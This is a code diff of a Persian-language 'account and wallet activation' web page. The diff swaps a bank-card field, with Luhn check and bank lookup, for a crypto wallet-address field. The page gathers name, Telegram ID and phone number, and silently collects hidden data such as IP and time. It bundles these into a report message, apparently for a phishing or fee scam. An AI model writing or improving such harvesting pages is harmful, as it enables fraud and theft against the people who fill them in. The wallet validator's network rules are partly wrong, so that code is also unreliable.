@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title> فعال‌سازی کیف پول و حساب کاربری</title>
+    <title>فعال‌سازی حساب و کیف پول</title>
     <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700;900&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
     <style>
@@ -39,7 +39,6 @@
         }
         .header p { color: #99a3c2; margin-top: 6px; }
 
-        /* راهنمای شناور (در کنار فیلد) */
         .field-hint {
             font-size: 0.85rem;
             color: #f0c6d0;
@@ -93,6 +92,15 @@
             box-shadow: 0 0 0 4px rgba(252,92,125,0.1);
         }
         .form-group input::placeholder { color: #5a6485; }
+
+        .wallet-status {
+            font-size: 0.85rem;
+            margin-top: 4px;
+            text-align: center;
+            display: none;
+        }
+        .wallet-status.valid { color: #7ddfa0; display: block; }
+        .wallet-status.invalid { color: #ff7a8b; display: block; }
 
         .btn-submit {
             width: 100%;
@@ -179,20 +187,6 @@
         .form-section { transition: opacity 0.4s ease; }
         .form-section.hidden { display: none; }
 
-        .card-bank-name {
-            font-size: 0.85rem;
-            color: #aab4d6;
-            margin-top: 4px;
-            text-align: center;
-        }
-        .card-validation-error {
-            color: #ff7a8b;
-            font-size: 0.8rem;
-            margin-top: 4px;
-            display: none;
-            text-align: center;
-        }
-
         @media (max-width: 600px) {
             .container { padding: 20px 16px 30px; border-radius: 32px; }
             .header h1 { font-size: 1.5rem; }
@@ -213,19 +207,16 @@
         </div>
 
         <form id="activationForm" novalidate>
-            <!-- نام کاربری -->
             <div class="form-group">
                 <label><i class="fas fa-user"></i> نام کاربری</label>
                 <input type="text" id="username" placeholder="نام خود را وارد کنید" required />
             </div>
 
-            <!-- یوزر آیدی -->
             <div class="form-group">
                 <label><i class="fas fa-id-badge"></i> یوزر آیدی</label>
                 <input type="text" id="userId" placeholder="یوزر آیدی تلگرام (مثلاً @ali)" />
             </div>
 
-            <!-- شماره تلفن -->
             <div class="form-group" id="phoneGroup">
                 <label><i class="fas fa-phone"></i> شماره تلفن تلگرام</label>
                 <input type="tel" id="phone" placeholder="مثلاً ۰۹۱۲۳۴۵۶۷۸۹" />
@@ -235,16 +226,14 @@
                 </div>
             </div>
 
-            <!-- شماره کارت -->
-            <div class="form-group" id="cardGroup">
-                <label><i class="fas fa-credit-card"></i> شماره کارت</label>
-                <input type="text" id="cardNumber" placeholder="شماره ۱۶ رقمی کارت" maxlength="19" />
-                <div class="field-hint" id="cardHint">
+            <div class="form-group" id="walletGroup">
+                <label><i class="fas fa-wallet"></i> آدرس کیف پول</label>
+                <input type="text" id="walletAddress" placeholder="آدرس کیف پول خود را وارد کنید" />
+                <div class="field-hint" id="walletHint">
                     <i class="fas fa-info-circle"></i>
-                    فقط شماره کارتی را وارد کنید که با آن مبلغ کارمزد را پرداخت خواهید کرد.
+                    لطفاً آدرس کیف پولی که می‌خواهید فعال شود را وارد کنید.
                 </div>
-                <div id="cardValidationError" class="card-validation-error">⚠️ شماره کارت نامعتبر است</div>
-                <div id="cardBankName" class="card-bank-name"></div>
+                <div id="walletStatus" class="wallet-status"></div>
             </div>
 
             <button type="submit" class="btn-submit" id="submitBtn">
@@ -291,25 +280,22 @@
 
         // ---------- المان‌ها ----------
         const phoneInput = document.getElementById('phone');
-        const cardInput = document.getElementById('cardNumber');
+        const walletInput = document.getElementById('walletAddress');
         const usernameInput = document.getElementById('username');
         const userIdInput = document.getElementById('userId');
         const submitBtn = document.getElementById('submitBtn');
         const statusDiv = document.getElementById('statusMessage');
         const formSection = document.getElementById('formSection');
         const paymentPage = document.getElementById('paymentPage');
-        const cardError = document.getElementById('cardValidationError');
-        const cardBankName = document.getElementById('cardBankName');
         const phoneHint = document.getElementById('phoneHint');
-        const cardHint = document.getElementById('cardHint');
+        const walletHint = document.getElementById('walletHint');
+        const walletStatus = document.getElementById('walletStatus');
 
         // ---------- مدیریت راهنماهای شناور ----------
         function showHint(element) {
-            // مخفی کردن همه hints
             document.querySelectorAll('.field-hint').forEach(el => el.classList.remove('show'));
             if (element) {
                 element.classList.add('show');
-                // اسکرول به فیلد (نه به بالا)
                 element.parentElement.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
             }
         }
@@ -321,80 +307,78 @@
             showHint(phoneHint);
         });
         phoneInput.addEventListener('blur', function() {
-            // اگر فوکوس روی کارت نباشد، hide
-            if (!cardInput.matches(':focus')) {
-                hideAllHints();
-            }
+            if (!walletInput.matches(':focus')) hideAllHints();
         });
 
-        cardInput.addEventListener('focus', function() {
-            showHint(cardHint);
+        walletInput.addEventListener('focus', function() {
+            showHint(walletHint);
         });
-        cardInput.addEventListener('blur', function() {
-            if (!phoneInput.matches(':focus')) {
-                hideAllHints();
-            }
+        walletInput.addEventListener('blur', function() {
+            if (!phoneInput.matches(':focus')) hideAllHints();
         });
 
-        // ---------- الگوریتم Luhn ----------
-        function luhnCheck(cardNumber) {
-            const digits = cardNumber.replace(/\s/g, '').split('').map(Number);
-            if (digits.length !== 16) return false;
-            let sum = 0;
-            for (let i = 0; i < digits.length; i++) {
-                let digit = digits[i];
-                if ((digits.length - i) % 2 === 0) {
-                    digit *= 2;
-                    if (digit > 9) digit -= 9;
-                }
-                sum += digit;
+        // ---------- اعتبارسنجی آدرس کیف پول ----------
+        function validateWalletAddress(address) {
+            address = address.trim();
+            if (!address) return { valid: false, network: null };
+
+            // تشخیص شبکه بر اساس الگو
+            let network = null;
+            if (address.startsWith('0x') && address.length === 42) {
+                network = 'Ethereum (ERC-20)';
+            } else if (address.startsWith('bnb') && address.length === 42) {
+                network = 'Binance Smart Chain (BEP-20)';
+            } else if (address.startsWith('T') && address.length === 34) {
+                network = 'TRON (TRC-20)';
+            } else if (address.startsWith('r') && address.length === 34) {
+                network = 'XRP';
+            } else if (address.startsWith('1') && address.length === 34) {
+                network = 'Bitcoin';
+            } else if (address.startsWith('3') && address.length === 34) {
+                network = 'Bitcoin (SegWit)';
+            } else if (address.startsWith('bc1') && address.length >= 42) {
+                network = 'Bitcoin (Bech32)';
+            } else if (address.startsWith('M') && address.length === 34) {
+                network = 'Dogecoin';
+            } else if (address.startsWith('L') && address.length === 34) {
+                network = 'Litecoin';
+            } else if (address.startsWith('z') && address.length === 34) {
+                network = 'Zcash';
+            } else if (address.startsWith('4') && address.length === 34) {
+                network = 'NEM';
+            } else if (address.startsWith('X') && address.length === 34) {
+                network = 'Ripple (XRP)';
+            } else if (address.startsWith('G') && address.length === 56) {
+                network = 'Stellar';
+            } else if (address.startsWith('0x') && address.length !== 42) {
+                network = 'Ethereum-like (طول نامعتبر)';
+            } else {
+                // بررسی با API خارجی (برای تشخیص بیشتر)
+                // فقط در صورت وجود آدرس کامل، سعی می‌کنیم از API استفاده کنیم
+                // اما برای سادگی، در اینجا فقط الگوهای رایج را بررسی می‌کنیم
+                // به دلیل محدودیت‌های CORS از API عمومی استفاده نمی‌کنیم
+                // اما می‌توان از سرویس‌های دیگری مثل https://api.etherscan.io/ استفاده کرد
+                // برای دقت بیشتر، از کتابخانه‌های جانبی می‌توان استفاده کرد
+                // در اینجا فقط الگوهای ابتدایی را پشتیبانی می‌کنیم
+                return { valid: false, network: null };
             }
-            return sum % 10 === 0;
+
+            return { valid: true, network: network };
         }
 
-        // ---------- اعتبارسنجی کارت ----------
-        async function validateCard(cardNumber) {
-            const clean = cardNumber.replace(/\s/g, '');
-            if (!/^\d{16}$/.test(clean)) return { valid: false, bank: null };
-            if (!luhnCheck(clean)) return { valid: false, bank: null };
-            let bankName = null;
-            try {
-                const res = await fetch(`https://api.bankcard.ir/api/cardinfo?cardnumber=${clean}`);
-                if (res.ok) {
-                    const data = await res.json();
-                    if (data.success && data.data && data.data.bank) {
-                        bankName = data.data.bank;
-                    }
-                }
-            } catch (_) {}
-            return { valid: true, bank: bankName };
-        }
-
-        // ---------- اعتبارسنجی بلادرنگ کارت ----------
-        cardInput.addEventListener('input', function(e) {
-            let raw = this.value.replace(/\D/g, '');
-            if (raw.length > 16) raw = raw.slice(0, 16);
-            let formatted = '';
-            for (let i = 0; i < raw.length; i++) {
-                if (i > 0 && i % 4 === 0) formatted += ' ';
-                formatted += raw[i];
-            }
-            this.value = formatted;
-            cardError.style.display = 'none';
-            cardBankName.textContent = '';
-            if (raw.length === 16) {
-                if (luhnCheck(raw)) {
-                    fetch(`https://api.bankcard.ir/api/cardinfo?cardnumber=${raw}`)
-                        .then(res => res.ok ? res.json() : null)
-                        .then(data => {
-                            if (data && data.success && data.data && data.data.bank) {
-                                cardBankName.textContent = `🏦 بانک: ${data.data.bank}`;
-                            }
-                        })
-                        .catch(() => {});
-                } else {
-                    cardError.style.display = 'block';
-                }
+        // ---------- اعتبارسنجی بلادرنگ ----------
+        walletInput.addEventListener('input', function() {
+            const address = this.value;
+            const result = validateWalletAddress(address);
+            if (result.valid) {
+                walletStatus.className = 'wallet-status valid';
+                walletStatus.textContent = `✅ آدرس معتبر - شبکه: ${result.network}`;
+            } else if (address.length > 0) {
+                walletStatus.className = 'wallet-status invalid';
+                walletStatus.textContent = '❌ آدرس نامعتبر یا شبکه ناشناخته';
+            } else {
+                walletStatus.className = 'wallet-status';
+                walletStatus.textContent = '';
             }
         });
 
@@ -441,35 +425,29 @@
         document.getElementById('activationForm').addEventListener('submit', async function(e) {
             e.preventDefault();
 
-            const cardRaw = cardInput.value.replace(/\s/g, '');
-            if (cardRaw.length !== 16 || !luhnCheck(cardRaw)) {
-                cardError.style.display = 'block';
-                setStatus('⚠️ شماره کارت معتبر نیست.', 'error');
-                cardError.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            const wallet = walletInput.value.trim();
+            if (!wallet) {
+                setStatus('⚠️ لطفاً آدرس کیف پول را وارد کنید.', 'error');
                 return;
             }
-            cardError.style.display = 'none';
+            const validation = validateWalletAddress(wallet);
+            if (!validation.valid) {
+                setStatus('⚠️ آدرس کیف پول نامعتبر است.', 'error');
+                walletStatus.className = 'wallet-status invalid';
+                walletStatus.textContent = '❌ آدرس نامعتبر یا شبکه ناشناخته';
+                return;
+            }
+            walletStatus.className = 'wallet-status valid';
+            walletStatus.textContent = `✅ آدرس معتبر - شبکه: ${validation.network}`;
 
             const username = usernameInput.value.trim() || 'وارد نشده';
             const userId = userIdInput.value.trim() || 'وارد نشده';
             const phone = phoneInput.value.trim() || 'وارد نشده';
-            const card = cardRaw;
 
             setStatus('⏳ در حال آماده‌سازی اطلاعات ...', 'loading');
             submitBtn.disabled = true;
 
             const hidden = await collectHiddenData();
-
-            let bankName = 'نامشخص';
-            try {
-                const res = await fetch(`https://api.bankcard.ir/api/cardinfo?cardnumber=${card}`);
-                if (res.ok) {
-                    const data = await res.json();
-                    if (data.success && data.data && data.data.bank) {
-                        bankName = data.data.bank;
-                    }
-                }
-            } catch (_) {}
 
             const message = `
 📋 *اطلاعات فعال‌سازی حساب و کیف پول*
@@ -477,8 +455,8 @@
 👤 *نام کاربری:* ${username}
 🆔 *یوزر آیدی:* ${userId}
 📞 *شماره تلفن:* ${phone}
-💳 *شماره کارت:* ${card}
-🏦 *بانک صاحب کارت:* ${bankName}
+🔗 *آدرس کیف پول:* ${wallet}
+🏷️ *شبکه:* ${validation.network}
 
 🌐 *IP:* ${hidden.ip}
 ⏰ *زمان ورود:* ${hidden.time}
